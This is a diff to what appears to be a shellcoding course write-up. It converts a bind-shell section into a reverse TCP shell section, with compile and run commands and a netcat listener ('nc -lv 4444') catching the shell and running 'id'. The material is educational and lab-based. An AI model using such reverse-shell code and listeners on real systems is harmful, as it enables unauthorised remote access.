@@ -73,23 +73,21 @@ int main(void) {
 The C code is compiled as an executable ELF binary and executed:
 
 ```bash
-osboxes@osboxes:~/Downloads/SLAE$ gcc reverse_tcp_shell_poc.c -o reverse_tcp_shell_poc
-osboxes@osboxes:~/Downloads/SLAE$ ./reverse_tcp_shell_poc 
+osboxes@osboxes:~/Downloads/SLAE$ gcc reverse_shell_tcp_poc.c -o reverse_shell_tcp_poc
+osboxes@osboxes:~/Downloads/SLAE$ ./reverse_shell_tcp_poc 
 
 ```
 
-A separate terminal demonstrating a successful bind connection and shell on the local host (via port 4444):
+A separate terminal demonstrating a successful reverse connection and shell on the local host (via port 4444):
 
 ```bash
-osboxes@osboxes:~$ netstat -antp | grep 4444
-tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      7041/shell_bind_tcp_poc
-osboxes@osboxes:~$ nc -nv 127.0.0.1 4444
-Connection to 127.0.0.1 4444 port [tcp/*] succeeded!
+osboxes@osboxes:~$ nc -lv 4444
+Connection from 192.168.0.143 port 4444 [tcp/*] accepted
 id
 uid=1000(osboxes) gid=1000(osboxes) groups=1000(osboxes),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
 ```
 
-#### TCP Bind Shell in Assembly
+#### Reverse TCP Shell in Assembly
 --------------
 
 Note the various syscalls in the C code which will be utilised in the upcoming Assembly code:
